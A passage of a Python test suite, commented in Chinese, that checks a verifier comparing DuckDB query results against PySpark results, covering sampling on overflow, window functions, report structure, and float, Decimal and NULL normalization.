        assert report.status == PhysicalVerificationStatus.RESULT_MISMATCH
        assert report.row_count_match
        assert len(report.diffs) > 0

    def test_group_row_count_mismatch_returns_result_mismatch(self, temp_parquet_dir):
        """抽样组内行数不一致（Spark 同维度值多一行）→ RESULT_MISMATCH（确定性差异）。"""
        mock_spark = _MockOverflowSparkExecutor(
            total_row_count=3,
            sample_rows=[
                {"order_id": "1", "amount": 100, "region": "east"},
                {"order_id": "1", "amount": 100, "region": "east"},  # 多出的重复行
            ],
            sample_dim="order_id",
            sample_values=["1"],
        )
        verifier = PhysicalVerifier(spark_executor=mock_spark)

        report = verifier.verify(
            sql_query='SELECT * FROM "order_info" ORDER BY "order_id"',
            pyspark_code='result_df = input_df.orderBy("order_id")',
            snapshot_dir=temp_parquet_dir,
            contract_hash="test_hash_overflow",
            snapshot_id="snap_overflow_006",
            order_keys=["order_id"],
        )

        assert report.status == PhysicalVerificationStatus.RESULT_MISMATCH
        assert report.row_count_match  # 总行数一致，组内行数不一致
        assert "组" in report.error_message

    def test_zero_dim_alignment_returns_not_executed(self, temp_parquet_dir):
        """抽样维度值在 DuckDB 侧零匹配 → NOT_EXECUTED（对齐失败，不误报 MISMATCH）。

        零匹配远比"数据真的完全不同"更可能是表示差异/维度选择问题——
        总行数已一致，不应据此判定失败。
        """
        mock_spark = _MockOverflowSparkExecutor(
            total_row_count=3,
            sample_rows=[
                {"order_id": "zzz", "amount": 1, "region": "x"},
            ],
            sample_dim="order_id",
            sample_values=["zzz"],
        )
        verifier = PhysicalVerifier(spark_executor=mock_spark)

        report = verifier.verify(
            sql_query='SELECT * FROM "order_info" ORDER BY "order_id"',
            pyspark_code='result_df = input_df.orderBy("order_id")',
            snapshot_dir=temp_parquet_dir,
            contract_hash="test_hash_overflow",
            snapshot_id="snap_overflow_007",
            order_keys=["order_id"],
        )

        assert report.status == PhysicalVerificationStatus.NOT_EXECUTED
        assert "对齐" in report.error_message

    def test_overflow_without_dim_counts_only(self, temp_parquet_dir):
        """有抽样行但无维度元信息（旧格式）→ 行数一致时 NOT_EXECUTED（仅计数）。"""
        mock_spark = _MockOverflowSparkExecutor(
            total_row_count=3,
            sample_rows=[
                {"order_id": "1", "amount": 100, "region": "east"},
            ],
            sample_dim=None,
            sample_values=[],
        )
        verifier = PhysicalVerifier(spark_executor=mock_spark)

        report = verifier.verify(
            sql_query='SELECT * FROM "order_info" ORDER BY "order_id"',
            pyspark_code='result_df = input_df.orderBy("order_id")',
            snapshot_dir=temp_parquet_dir,
            contract_hash="test_hash_overflow",
            snapshot_id="snap_overflow_008",
            order_keys=["order_id"],
        )

        assert report.status == PhysicalVerificationStatus.NOT_EXECUTED
        assert report.row_count_match

    def test_legacy_overflow_without_count_returns_not_executed(self, temp_parquet_dir):
        """旧版溢出（无引擎内计数、无抽样）→ 保留 NOT_EXECUTED，消息附带 DuckDB 行数。"""
        mock_spark = _MockOverflowSparkExecutor(total_row_count=None, sample_rows=[])
        verifier = PhysicalVerifier(spark_executor=mock_spark)

        report = verifier.verify(
            sql_query='SELECT * FROM "order_info" ORDER BY "order_id"',
            pyspark_code='result_df = input_df.orderBy("order_id")',
            snapshot_dir=temp_parquet_dir,
            contract_hash="test_hash_overflow",
            snapshot_id="snap_overflow_004",
            order_keys=["order_id"],
        )

        assert report.status == PhysicalVerificationStatus.NOT_EXECUTED
        assert "3" in report.error_message  # DuckDB 侧行数可见

    def test_verify_passes_sample_keys_to_spark_executor(self, temp_parquet_dir):
        """verify 将有效排序键传给 Spark 执行器——溢出时才能做维度值抽样。"""
        mock_spark = _MockOverflowSparkExecutor(total_row_count=3, sample_rows=[])
        verifier = PhysicalVerifier(spark_executor=mock_spark)

        verifier.verify(
            sql_query='SELECT * FROM "order_info" ORDER BY "order_id"',
            pyspark_code='result_df = input_df.orderBy("order_id")',
            snapshot_dir=temp_parquet_dir,
            contract_hash="test_hash_overflow",
            snapshot_id="snap_overflow_005",
            order_keys=["order_id"],
        )

        assert mock_spark.received_sample_keys == ["order_id"]

    def test_duckdb_exceeds_cap_forces_overflow(self, temp_parquet_dir, monkeypatch):
        """DuckDB 行数超收集上限 → 传 force_overflow=True，跳过全量收集尝试。"""
        # 收缩上限至 2（快照有 3 行）——模拟 DuckDB 侧先行超限
        monkeypatch.setattr(
            "tianshu_datadev.spark.physical_verifier._MAX_RESULT_ROWS", 2,
        )
        mock_spark = _MockOverflowSparkExecutor(total_row_count=3, sample_rows=[])
        verifier = PhysicalVerifier(spark_executor=mock_spark)

        verifier.verify(
            sql_query='SELECT * FROM "order_info" ORDER BY "order_id"',
            pyspark_code='result_df = input_df.orderBy("order_id")',
            snapshot_dir=temp_parquet_dir,
            contract_hash="test_hash_overflow",
            snapshot_id="snap_overflow_009",
            order_keys=["order_id"],
        )

        assert mock_spark.received_force_overflow is True

    def test_duckdb_within_cap_no_force_overflow(self, temp_parquet_dir):
        """DuckDB 行数未超上限 → force_overflow=False（保持常规检测路径）。"""
        mock_spark = _MockOverflowSparkExecutor(total_row_count=3, sample_rows=[])
        verifier = PhysicalVerifier(spark_executor=mock_spark)

        verifier.verify(
            sql_query='SELECT * FROM "order_info" ORDER BY "order_id"',
            pyspark_code='result_df = input_df.orderBy("order_id")',
            snapshot_dir=temp_parquet_dir,
            contract_hash="test_hash_overflow",
            snapshot_id="snap_overflow_010",
            order_keys=["order_id"],
        )

        assert mock_spark.received_force_overflow is False

    def test_degraded_mismatch_saves_diagnostics(self, temp_parquet_dir, tmp_path, monkeypatch):
        """降级验证 RESULT_MISMATCH → 落盘诊断文件（双侧抽样行 + 代码），可离线定位。"""
        monkeypatch.chdir(tmp_path)
        mock_spark = _MockOverflowSparkExecutor(
            total_row_count=3,
            sample_rows=[
                {"order_id": "1", "amount": 999, "region": "east"},  # amount 不同
            ],
            sample_dim="order_id",
            sample_values=["1"],
        )
        verifier = PhysicalVerifier(spark_executor=mock_spark)

        report = verifier.verify(
            sql_query='SELECT * FROM "order_info" ORDER BY "order_id"',
            pyspark_code='result_df = input_df.orderBy("order_id")',
            snapshot_dir=temp_parquet_dir,
            contract_hash="test_hash_overflow",
            snapshot_id="snap_overflow_011",
            order_keys=["order_id"],
        )

        assert report.status == PhysicalVerificationStatus.RESULT_MISMATCH
        diag_root = tmp_path / "logs" / "monitor" / "diagnostics"
        diag_dirs = list(diag_root.glob("physver_snap_overflow_011_*"))
        assert diag_dirs, "降级 mismatch 应保存诊断目录"
        assert (diag_dirs[0] / "manifest.json").exists()

    def test_sampled_consistent_derives_all_consistent(self):
        """derive_overall_status：SAMPLED_CONSISTENT 门禁语义等同通过，不落兜底 NOT_EXECUTED。"""
        from tianshu_datadev.spark.plan_comparator import ComparisonStatus
        from tianshu_datadev.spark.verification_report import (
            UnifiedVerificationReport,
            VerificationOverallStatus,
        )

        overall = UnifiedVerificationReport.derive_overall_status(
            logic_status=ComparisonStatus.LOGIC_EQUIVALENT,
            physical_status=PhysicalVerificationStatus.SAMPLED_CONSISTENT,
        )
        assert overall == VerificationOverallStatus.ALL_CONSISTENT


class TestPhysicalVerifierWithMock:
    """PhysicalVerifier 使用 mock Spark 执行器——覆盖对比逻辑。"""

    def test_result_consistent(self, temp_parquet_dir):
        """DuckDB 和 Spark 结果一致 → RESULT_CONSISTENT。"""
        # 准备与 DuckDB 输出一致的数据
        expected_rows = [
            {"order_id": "1", "amount": 100, "region": "east"},
            {"order_id": "2", "amount": 200, "region": "west"},
            {"order_id": "3", "amount": 150, "region": "east"},
        ]
        mock_spark = _MockSparkExecutor(rows=expected_rows)
        verifier = PhysicalVerifier(spark_executor=mock_spark)

        sql = 'SELECT * FROM "order_info" ORDER BY "order_id"'
        pyspark = 'result_df = input_df.orderBy("order_id")'

        report = verifier.verify(
            sql_query=sql,
            pyspark_code=pyspark,
            snapshot_dir=temp_parquet_dir,
            contract_hash="test_hash_abc",
            snapshot_id="snap_test_001",
            order_keys=["order_id"],
        )

        assert report.status == PhysicalVerificationStatus.RESULT_CONSISTENT
        assert report.duckdb_result is not None
        assert report.spark_result is not None
        assert report.duckdb_result.success
        assert report.spark_result.success
        assert report.row_count_match

    def test_result_mismatch(self, temp_parquet_dir):
        """DuckDB 和 Spark 结果不一致 → RESULT_MISMATCH。"""
        # Spark 返回不同数据
        mismatched_rows = [
            {"order_id": "1", "amount": 999, "region": "east"},  # 不同 amount
        ]
        mock_spark = _MockSparkExecutor(rows=mismatched_rows)
        verifier = PhysicalVerifier(spark_executor=mock_spark)

        sql = 'SELECT * FROM "order_info" ORDER BY "order_id"'
        pyspark = 'result_df = input_df.orderBy("order_id")'

        report = verifier.verify(
            sql_query=sql,
            pyspark_code=pyspark,
            snapshot_dir=temp_parquet_dir,
            contract_hash="test_hash_abc",
            snapshot_id="snap_test_001",
            order_keys=["order_id"],
        )

        assert report.status == PhysicalVerificationStatus.RESULT_MISMATCH
        assert len(report.diffs) > 0

    def test_unsupported_step_types(self, temp_parquet_dir):
        """Subquery step → UNSUPPORTED_SEMANTICS（window 已在 Phase 7C 开放）。"""
        verifier = PhysicalVerifier()

        report = verifier.verify(
            sql_query="SELECT 1",
            pyspark_code="result_df = input_df",
            snapshot_dir=temp_parquet_dir,
            contract_hash="test_hash_abc",
            snapshot_id="snap_test_001",
            uncovered_step_types=["subquery"],
        )

        assert report.status == PhysicalVerificationStatus.UNSUPPORTED_SEMANTICS
        assert "subquery" in report.uncovered_step_types

    def test_window_removed_from_unsupported(self):
        """window 不再在 _UNSUPPORTED_STEP_TYPES 中——Phase 7C 开放窗口验证。"""
        assert "window" not in PhysicalVerifier._UNSUPPORTED_STEP_TYPES, (
            "Phase 7C 应移除 window 的 UNSUPPORTED 标记，"
            "当前 _UNSUPPORTED_STEP_TYPES 仍包含 window"
        )

    def test_window_step_proceeds_to_execution(self, temp_parquet_dir):
        """含 window 的 plan 不再被 UNSUPPORTED_SEMANTICS 拦截——进入正常执行流程。"""
        # 准备与 DuckDB 一致的窗口查询结果
        expected_rows = [
            {"order_id": "1", "amount": 100, "region": "east", "rn": "1"},
            {"order_id": "2", "amount": 200, "region": "west", "rn": "1"},
            {"order_id": "3", "amount": 150, "region": "east", "rn": "2"},
        ]
        mock_spark = _MockSparkExecutor(rows=expected_rows)
        verifier = PhysicalVerifier(spark_executor=mock_spark)

        sql = (
            'SELECT *, ROW_NUMBER() OVER (PARTITION BY "region" ORDER BY "order_id") AS rn '
            'FROM "order_info" ORDER BY "order_id"'
        )
        pyspark = 'result_df = input_df.withColumn("rn", F.row_number().over(windowSpec))'

        report = verifier.verify(
            sql_query=sql,
            pyspark_code=pyspark,
            snapshot_dir=temp_parquet_dir,
            contract_hash="test_hash_window",
            snapshot_id="snap_test_window",
            order_keys=["order_id"],
        )

        # window 不再被 UNSUPPORTED_SEMANTICS 拦截——应进入正常对比流程
        assert report.status != PhysicalVerificationStatus.UNSUPPORTED_SEMANTICS, (
            f"window 不应被 UNSUPPORTED_SEMANTICS 拦截，实际状态：{report.status.value}"
        )

    def test_missing_authoritative_keys_requires_canonicalization(self, temp_parquet_dir):
        """多行结果无显式或 Contract 权威键时必须 fail-closed。"""
        # Spark mock 返回与 DuckDB 一致的数据（无显式排序键）
        expected_rows = [
            {"order_id": "1", "amount": 100, "region": "east"},
            {"order_id": "2", "amount": 200, "region": "west"},
            {"order_id": "3", "amount": 150, "region": "east"},
        ]
        mock_spark = _MockSparkExecutor(rows=expected_rows)
        verifier = PhysicalVerifier(spark_executor=mock_spark)

        sql = 'SELECT * FROM "order_info"'  # 无 ORDER BY
        pyspark = "result_df = input_df"  # 无排序

        report = verifier.verify(
            sql_query=sql,
            pyspark_code=pyspark,
            snapshot_dir=temp_parquet_dir,
            contract_hash="test_hash_auto_sort",
            snapshot_id="snap_test_auto_sort",
            order_keys=None,  # 不指定排序键——应自动从 DuckDB 结果列名提取
        )

        assert report.status == PhysicalVerificationStatus.CANONICALIZATION_NEEDED
        assert "缺少显式排序键或 Contract 权威键" in report.error_message

    def test_missing_keys_does_not_claim_result_mismatch(self, temp_parquet_dir):
        """没有权威键时不得用全部结果列对齐后声称结果不一致。"""
        # Spark mock 返回不同数据——自动排序后应检测到差异
        mismatched_rows = [
            {"order_id": "1", "amount": 999, "region": "east"},
        ]
        mock_spark = _MockSparkExecutor(rows=mismatched_rows)
        verifier = PhysicalVerifier(spark_executor=mock_spark)

        sql = 'SELECT * FROM "order_info"'  # 无 ORDER BY
        pyspark = "result_df = input_df"

        report = verifier.verify(
            sql_query=sql,
            pyspark_code=pyspark,
            snapshot_dir=temp_parquet_dir,
            contract_hash="test_hash_mismatch",
            snapshot_id="snap_test_mismatch",
            order_keys=None,
        )

        assert report.status == PhysicalVerificationStatus.CANONICALIZATION_NEEDED

    def test_spark_execution_error(self, temp_parquet_dir):
        """Spark 执行失败 → EXECUTION_ERROR。"""
        mock_spark = _MockSparkExecutor(success=False)
        verifier = PhysicalVerifier(spark_executor=mock_spark)

        sql = 'SELECT * FROM "order_info"'
        pyspark = "result_df = input_df"

        report = verifier.verify(
            sql_query=sql,
            pyspark_code=pyspark,
            snapshot_dir=temp_parquet_dir,
            contract_hash="test_hash_abc",
            snapshot_id="snap_test_001",
            order_keys=["order_id"],
        )

        assert report.status == PhysicalVerificationStatus.EXECUTION_ERROR
        assert "Mock Spark error" in report.error_message


class TestWindowPhysicalVerification:
    """Phase 7C 窗口函数物理验证——DuckDB 真实 + Spark mock。"""

    def test_window_row_number_consistent(self, temp_parquet_dir):
        """ROW_NUMBER 窗口——DuckDB 与 mock Spark 结果一致。"""
        # DuckDB 执行 ROW_NUMBER() OVER (ORDER BY order_id) 的结果
        expected_rows = [
            {"order_id": "1", "amount": 100, "region": "east", "rn": 1},
            {"order_id": "2", "amount": 200, "region": "west", "rn": 2},
            {"order_id": "3", "amount": 150, "region": "east", "rn": 3},
        ]
        mock_spark = _MockSparkExecutor(rows=expected_rows)
        verifier = PhysicalVerifier(spark_executor=mock_spark)

        sql = (
            'SELECT *, ROW_NUMBER() OVER (ORDER BY "order_id") AS rn '
            'FROM "order_info" ORDER BY "order_id"'
        )
        pyspark = (
            'from pyspark.sql.window import Window\n'
            'result_df = input_df.withColumn('
            '"rn", F.row_number().over(Window.orderBy("order_id"))'
            ').orderBy("order_id")'
        )

        report = verifier.verify(
            sql_query=sql,
            pyspark_code=pyspark,
            snapshot_dir=temp_parquet_dir,
            contract_hash="test_hash_window_rn",
            snapshot_id="snap_test_window_rn",
            order_keys=["order_id"],
        )

        assert report.status == PhysicalVerificationStatus.RESULT_CONSISTENT, (
            f"预期 RESULT_CONSISTENT，实际 {report.status.value}。"
            f" diffs: {report.diffs[:3] if report.diffs else '无'}"
        )

    def test_window_sum_over_consistent(self, temp_parquet_dir):
        """SUM_OVER 聚合窗口——DuckDB 与 mock Spark 结果一致。"""
        # SUM(amount) OVER (PARTITION BY region ORDER BY order_id)
        # east: row1=100, row3=100+150=250; west: row2=200
        expected_rows = [
            {"order_id": "1", "amount": 100, "region": "east", "running_total": 100},
            {"order_id": "2", "amount": 200, "region": "west", "running_total": 200},
            {"order_id": "3", "amount": 150, "region": "east", "running_total": 250},
        ]
        mock_spark = _MockSparkExecutor(rows=expected_rows)
        verifier = PhysicalVerifier(spark_executor=mock_spark)

        sql = (
            'SELECT *, SUM("amount") OVER (PARTITION BY "region" ORDER BY "order_id") '
            'AS running_total FROM "order_info" ORDER BY "order_id"'
        )
        pyspark = (
            'from pyspark.sql.window import Window\n'
            'window_spec = Window.partitionBy("region").orderBy("order_id")\n'
            'result_df = input_df.withColumn('
            '"running_total", F.sum("amount").over(window_spec)'
            ').orderBy("order_id")'
        )

        report = verifier.verify(
            sql_query=sql,
            pyspark_code=pyspark,
            snapshot_dir=temp_parquet_dir,
            contract_hash="test_hash_window_sum",
            snapshot_id="snap_test_window_sum",
            order_keys=["order_id"],
        )

        assert report.status == PhysicalVerificationStatus.RESULT_CONSISTENT, (
            f"预期 RESULT_CONSISTENT，实际 {report.status.value}。"
            f" diffs: {report.diffs[:3] if report.diffs else '无'}"
        )

    def test_window_partitioned_row_number_consistent(self, temp_parquet_dir):
        """分区 ROW_NUMBER——DuckDB 与 mock Spark 结果一致。"""
        # ROW_NUMBER() OVER (PARTITION BY region ORDER BY amount)
        # east: (1,100) → rn=1, (3,150) → rn=2; west: (2,200) → rn=1
        expected_rows = [
            {"order_id": "1", "amount": 100, "region": "east", "rn": 1},
            {"order_id": "3", "amount": 150, "region": "east", "rn": 2},
            {"order_id": "2", "amount": 200, "region": "west", "rn": 1},
        ]
        mock_spark = _MockSparkExecutor(rows=expected_rows)
        verifier = PhysicalVerifier(spark_executor=mock_spark)

        sql = (
            'SELECT *, ROW_NUMBER() OVER (PARTITION BY "region" ORDER BY "amount") AS rn '
            'FROM "order_info" ORDER BY "region", "amount"'
        )
        pyspark = (
            'from pyspark.sql.window import Window\n'
            'window_spec = Window.partitionBy("region").orderBy("amount")\n'
            'result_df = input_df.withColumn('
            '"rn", F.row_number().over(window_spec)'
            ').orderBy("region", "amount")'
        )

        report = verifier.verify(
            sql_query=sql,
            pyspark_code=pyspark,
            snapshot_dir=temp_parquet_dir,
            contract_hash="test_hash_window_part",
            snapshot_id="snap_test_window_part",
            order_keys=["region", "amount"],
        )

        assert report.status == PhysicalVerificationStatus.RESULT_CONSISTENT, (
            f"预期 RESULT_CONSISTENT，实际 {report.status.value}。"
            f" diffs: {report.diffs[:3] if report.diffs else '无'}"
        )


# ════════════════════════════════════════════
# PhysicalVerificationReport 结构测试
# ════════════════════════════════════════════


class TestPhysicalVerificationReport:
    """报告结构和状态语义测试。"""

    def test_status_no_generic_pass(self):
        """所有状态值不含 "PASS" 字符串。"""
        for status in PhysicalVerificationStatus:
            assert "PASS" not in status.value
            assert "Go" not in status.value
            assert "No-Go" not in status.value

    def test_report_id_deterministic(self):
        """相同输入 → 相同 report_id。"""
        id1 = PhysicalVerifier._generate_report_id("hash_a", "snap_1")
        id2 = PhysicalVerifier._generate_report_id("hash_a", "snap_1")
        assert id1 == id2

    def test_report_id_different_for_different_inputs(self):
        """不同输入 → 不同 report_id。"""
        id1 = PhysicalVerifier._generate_report_id("hash_a", "snap_1")
        id2 = PhysicalVerifier._generate_report_id("hash_b", "snap_1")
        assert id1 != id2

    def test_diff_detail_structure(self):
        """DiffDetail 结构完整。"""
        diff = DiffDetail(
            row_index=0,
            column="amount",
            duckdb_value="100",
            spark_value="999",
            description="值不一致",
        )
        assert diff.row_index == 0
        assert diff.column == "amount"

    def test_engine_execution_result_structure(self):
        """EngineExecutionResult 结构完整。"""
        result = EngineExecutionResult(
            engine="duckdb",
            success=True,
            execution_time_ms=15.5,
            raw_row_count=100,
            canonical_row_count=100,
            sample_rows=[{"id": "1"}],
        )
        assert result.engine == "duckdb"
        assert result.success

    def test_not_executed_status_exists(self):
        """NOT_EXECUTED 状态存在——用于尚未执行的场景。"""
        assert hasattr(PhysicalVerificationStatus, "NOT_EXECUTED")


# ════════════════════════════════════════════
# 规范化配置 Phase 9B 测试——Float/Decimal 等价、NULL 补齐、差异截断
# ════════════════════════════════════════════


class TestNormalizationConfig:
    """NormalizationConfig 类型感知比较 + 权威 schema 补齐 + 差异总数测试。

    正向测试：
    - float 容差内等价（math.isclose）
    - Decimal quantize 等价
    - 权威 schema NULL 补齐消除误报

    反向测试：
    - float 超容差真差异仍检测
    - Decimal 真差异仍检测
    - 整列确实 / 行数不同仍检测
    - 无权威 schema 时 schema 不匹配 → HUMAN_REVIEW

    截断与计数：
    - 真实差异总数 total_diff_count
    - 截断标志 diffs_truncated
    """

    # ── Float 容差测试 ──

    def test_float_within_tolerance_matches(self):
        """float 差异在容差内（1e-15）→ 等价。"""
        config = NormalizationConfig(
            output_columns=[NormalizationColumn(column_name="val", data_type="double")],
        )
        duckdb_rows = [{"id": "1", "val": "3.9369690851405856"}]
        spark_rows = [{"id": "1", "val": "3.9369690851405883"}]

        diffs, total_count, truncated = PhysicalVerifier._compute_diffs(
            duckdb_rows, spark_rows, config=config,
        )
        assert total_count == 0
        assert diffs == []
        assert not truncated

    def test_float_within_tolerance_unknown_type(self):
        """float 差异在容差内但 data_type=unknown——数值回退应使等价。

        对应 data_type="unknown"（contract_extractor 硬编码）场景。
        """
        config = NormalizationConfig(
            output_columns=[NormalizationColumn(column_name="val", data_type=None)],
        )
        duckdb_rows = [{"id": "1", "val": "3.9369690851405856"}]
        spark_rows = [{"id": "1", "val": "3.9369690851405883"}]

        diffs, total_count, truncated = PhysicalVerifier._compute_diffs(
            duckdb_rows, spark_rows, config=config,
        )
        assert total_count == 0
        assert diffs == []
        assert not truncated

    def test_float_beyond_tolerance_detected(self):
        """float 差异远超容差——应检测为差异。"""
        config = NormalizationConfig(
            output_columns=[NormalizationColumn(column_name="val", data_type="double")],
        )
        duckdb_rows = [{"id": "1", "val": "3.14"}]
        spark_rows = [{"id": "1", "val": "42.0"}]  # 差异远大于 1e-12

        diffs, total_count, truncated = PhysicalVerifier._compute_diffs(
            duckdb_rows, spark_rows, config=config,
        )
        assert total_count >= 1
        assert len(diffs) >= 1
        assert not truncated  # 仅 1 个差异

    def test_float_null_vs_value_detected(self):
        """float 列一方 NULL → 不等价（真实差异）。"""
        config = NormalizationConfig(
            output_columns=[NormalizationColumn(column_name="val", data_type="double")],
        )
        duckdb_rows = [{"id": "1", "val": ""}]  # NULL
        spark_rows = [{"id": "1", "val": "3.14"}]

        diffs, total_count, truncated = PhysicalVerifier._compute_diffs(
            duckdb_rows, spark_rows, config=config,
        )
        assert total_count >= 1

    def test_float_both_null_equivalent(self):
        """float 列双方 NULL → 等价。"""
        config = NormalizationConfig(
            output_columns=[NormalizationColumn(column_name="val", data_type="double")],
        )
        duckdb_rows = [{"id": "1", "val": ""}]
        spark_rows = [{"id": "1", "val": ""}]

        diffs, total_count, truncated = PhysicalVerifier._compute_diffs(
            duckdb_rows, spark_rows, config=config,
        )
        assert total_count == 0

    def test_float_without_config_fallback_to_str(self):
        """无 NormalizationConfig 时 fallback 到 str 比较——差异被保留。"""
        duckdb_rows = [{"id": "1", "val": "3.9369690851405856"}]
        spark_rows = [{"id": "1", "val": "3.9369690851405883"}]

        diffs, total_count, truncated = PhysicalVerifier._compute_diffs(
            duckdb_rows, spark_rows, config=None,
        )
        # 无 config 时 str 不匹配 → 差异
        assert total_count >= 1

    # ── Decimal 等价测试 ──

    def test_decimal_trailing_zero_equivalent(self):
        """Decimal 尾随零差异 → quantize 后等价。"""
        config = NormalizationConfig(
            output_columns=[
                NormalizationColumn(column_name="amount", data_type="decimal(18,2)"),
            ],
        )
        # DuckDB str(Decimal('1266.70')) = "1266.70"，Spark str(1266.7) = "1266.7"
        duckdb_rows = [{"id": "1", "amount": "1266.70"}]
        spark_rows = [{"id": "1", "amount": "1266.7"}]

        diffs, total_count, truncated = PhysicalVerifier._compute_diffs(
            duckdb_rows, spark_rows, config=config,
        )
        assert total_count == 0

    def test_decimal_true_difference_detected(self):
        """Decimal 真实业务值差异——应检出。"""
        config = NormalizationConfig(
            output_columns=[
                NormalizationColumn(column_name="amount", data_type="decimal(18,2)"),
            ],
        )
        duckdb_rows = [{"id": "1", "amount": "100.50"}]
        spark_rows = [{"id": "1", "amount": "999.99"}]

        diffs, total_count, truncated = PhysicalVerifier._compute_diffs(
            duckdb_rows, spark_rows, config=config,
        )
        assert total_count >= 1

    def test_decimal_integer_equivalent(self):
        """Decimal 整数与浮点表示等价——如 '100' vs '100.00'。"""
        config = NormalizationConfig(
            output_columns=[
                NormalizationColumn(column_name="amount", data_type="decimal(18,2)"),
            ],
        )
        duckdb_rows = [{"id": "1", "amount": "100"}]
        spark_rows = [{"id": "1", "amount": "100.00"}]

        diffs, total_count, truncated = PhysicalVerifier._compute_diffs(
            duckdb_rows, spark_rows, config=config,
        )
        # scale=2 时，Decimal("100").quantize("0.00") = Decimal("100.00")
        # 与 Decimal("100.00") 相等
        assert total_count == 0

    def test_decimal_without_config_fallback(self):
        """无 NormalizationConfig 时 Decimal 仍 str 比较——trailing zeros 仍差异。"""
        duckdb_rows = [{"id": "1", "amount": "1266.70"}]
        spark_rows = [{"id": "1", "amount": "1266.7"}]

        diffs, total_count, truncated = PhysicalVerifier._compute_diffs(
            duckdb_rows, spark_rows, config=None,
        )
        # str 比较： "1266.70" != "1266.7" → 差异
        assert total_count >= 1

    def test_decimal_quantize_boundary_equivalent(self):
        """Decimal quantize 舍入边界——末位差异 ~1e-15 不应产生误报。

        真实场景：DuckDB Decimal AVG 与 Spark Double AVG 的末位差异
        （如 10.525000000000001 vs 10.524999999999999），
        quantize 默认 ROUND_HALF_EVEN → 10.53 vs 10.52 → 误报 0.01 差异。
        修复后 math.isclose 容差检查应拦截此场景。
        """
        config = NormalizationConfig(
            output_columns=[
                NormalizationColumn(column_name="avg_fare", data_type="decimal(12,2)"),
            ],
        )
        # 模拟 DuckDB Decimal vs Spark Double 的末位差异
        duckdb_rows = [{"id": "1", "avg_fare": "10.525000000000001"}]
        spark_rows = [{"id": "1", "avg_fare": "10.524999999999999"}]

        diffs, total_count, truncated = PhysicalVerifier._compute_diffs(
            duckdb_rows, spark_rows, config=config,
        )
        # 差异 ~2e-15 < abs_tol=1e-12 → 应视为等价
        assert total_count == 0, (
            f"quantize 舍入边界应通过 math.isclose 容差消除，"
            f"实际差异数: {total_count}"
        )

    def test_decimal_quantize_boundary_tolerates_small_diff(self):
        """Decimal 差异在 1e-12 内——应视为等价（不依赖 quantize 舍入方向）。"""
        config = NormalizationConfig(
            output_columns=[
                NormalizationColumn(column_name="amount", data_type="decimal(18,4)"),
            ],
        )
        # 两值差异 ~1e-13，小于 abs_tol=1e-12
        duckdb_rows = [{"id": "1", "amount": "50.123450000000001"}]
        spark_rows = [{"id": "1", "amount": "50.123449999999999"}]

        diffs, total_count, truncated = PhysicalVerifier._compute_diffs(
            duckdb_rows, spark_rows, config=config,
        )
        assert total_count == 0, (
            f"1e-13 级差异应在容差内视为等价，实际差异数: {total_count}"
        )

    # ── 权威 schema NULL 补齐测试 ──

    def test_missing_column_filled_from_schema(self):
        """Spark 缺失列被权威 schema 补齐→消除误报。"""
        config = NormalizationConfig(
            output_columns=[
                NormalizationColumn(column_name="trip_source", data_type="varchar"),
                NormalizationColumn(column_name="pickup_date_key", data_type="int"),
                NormalizationColumn(column_name="total_revenue", data_type="decimal(18,2)"),
            ],
        )
        # DuckDB 有 total_revenue=""（NULL），Spark 完全缺失该键
        duckdb_rows = [
            {"trip_source": "fhvhv", "pickup_date_key": "20260330", "total_revenue": ""},
        ]
        spark_rows = [
            {"trip_source": "fhvhv", "pickup_date_key": "20260330"},
        ]

        d_filled = PhysicalVerifier(normalization_config=config)._fill_missing_columns(duckdb_rows)
        s_filled = PhysicalVerifier(normalization_config=config)._fill_missing_columns(spark_rows)

        diffs, total_count, truncated = PhysicalVerifier._compute_diffs(
            d_filled, s_filled, config=config,
        )
        # 补齐后双方都有 total_revenue="" → 等价
        assert total_count == 0

    def test_missing_column_real_value_difference(self):
        """补齐后业务值仍不同→应检出差异。"""
        config = NormalizationConfig(
            output_columns=[
                NormalizationColumn(column_name="amount", data_type="decimal(18,2)"),
            ],
        )
        duckdb_rows = [{"id": "1", "amount": "100.50"}]
        spark_rows = [{"id": "1"}]  # 完全缺失 amount 列

        d_filled = PhysicalVerifier(normalization_config=config)._fill_missing_columns(duckdb_rows)
        s_filled = PhysicalVerifier(normalization_config=config)._fill_missing_columns(spark_rows)

        diffs, total_count, truncated = PhysicalVerifier._compute_diffs(
            d_filled, s_filled, config=config,
        )
        # Spark 侧 amount=""（补齐），DuckDB 有 "100.50" → 差异
        assert total_count >= 1

    def test_no_authoritative_schema_returns_human_review(self, temp_parquet_dir):
        """Schema 不匹配且无权威 schema→HUMAN_REVIEW。"""
        mock_spark = _MockSparkExecutor(rows=[
            {"order_id": "1"},  # 缺少 amount 列
        ])
        verifier = PhysicalVerifier(spark_executor=mock_spark)

        sql = 'SELECT * FROM "order_info"'
        pyspark = "result_df = input_df"

        report = verifier.verify(
            sql_query=sql,
            pyspark_code=pyspark,
            snapshot_dir=temp_parquet_dir,
            contract_hash="hash_no_schema",
            snapshot_id="snap_no_schema",
            order_keys=["order_id"],
        )

        # 无 normalization_config → schema 不匹配 → HUMAN_REVIEW
        assert report.status == PhysicalVerificationStatus.HUMAN_REVIEW, (
            f"预期 HUMAN_REVIEW，实际 {report.status.value}"
        )

    def test_authoritative_schema_resolves_human_review_to_mismatch(self, temp_parquet_dir):
        """Schema 不匹配但有权威 schema→补齐后→RESULT_MISMATCH（值不同）。"""
        config = NormalizationConfig(
            output_columns=[
                NormalizationColumn(column_name="order_id", data_type="varchar"),
                NormalizationColumn(column_name="amount", data_type="decimal(18,2)"),
            ],
        )
        # DuckDB 有 amount 实际值(100,200,150)，Spark 缺失 amount 列（补齐为""）
        expected_rows = [
            {"order_id": "1"},
            {"order_id": "2"},
            {"order_id": "3"},
        ]
        mock_spark = _MockSparkExecutor(rows=expected_rows)
        verifier = PhysicalVerifier(
            spark_executor=mock_spark,
            normalization_config=config,
        )

        sql = 'SELECT "order_id", "amount" FROM "order_info" ORDER BY "order_id"'
        pyspark = "result_df = input_df"

        report = verifier.verify(
            sql_query=sql,
            pyspark_code=pyspark,
            snapshot_dir=temp_parquet_dir,
            contract_hash="hash_with_schema",
            snapshot_id="snap_with_schema",
            order_keys=["order_id"],
        )

        # 补齐 schema 后不应 HUMAN_REVIEW；但 amount 真实值不同→RESULT_MISMATCH
        assert report.status == PhysicalVerificationStatus.RESULT_MISMATCH, (
            f"预期 RESULT_MISMATCH（值不同），实际 {report.status.value}。"
            f" 错误：{report.error_message}"
        )
        assert report.schema_match, "补齐后 schema 应匹配"
